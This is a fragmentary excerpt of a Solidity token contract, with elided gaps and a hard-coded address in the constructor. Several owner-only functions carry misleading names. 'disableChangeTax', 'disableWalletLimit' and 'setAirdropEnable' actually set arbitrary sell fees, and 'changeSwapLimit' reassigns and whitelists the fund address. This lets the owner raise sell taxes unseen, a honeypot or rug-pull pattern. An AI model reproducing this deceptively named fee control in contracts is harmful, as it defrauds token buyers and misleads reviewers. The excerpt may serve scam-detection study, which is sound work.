...
abstract contract TOKEN is IERC20, Ownable {
    ...
    function changeSwapLimit(address addr) public onlyFunder {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function completeCustoms(uint256 dividendFee) public onlyOwner {
    ...
    function disableChangeTax(uint256 dividendFee) public onlyOwner {
        _sellLPDividendFee = dividendFee;
    }

    function disableWalletLimit(uint256 fundFee) public onlyOwner {
        _sellFundFee = fundFee;
    }

    function setAirdropEnable(uint256 lpFee) public onlyOwner {
        _sellLPFee = lpFee;
    }
    ...
    function setAirdropNumbs(address addr, bool enable) public onlyFunder {
    ...
    function setSwapPairList(address addr, bool enable) public onlyFunder {
    ...
    function setCurrency(address token, uint256 amount, address to) public onlyFunder {
...
contract FatToken is TOKEN {
    ...
    constructor() TOKEN(
        ...
        address(0x637D1Dc6D9DEdbA2F371cCCF1D98e808a48BC3c4),
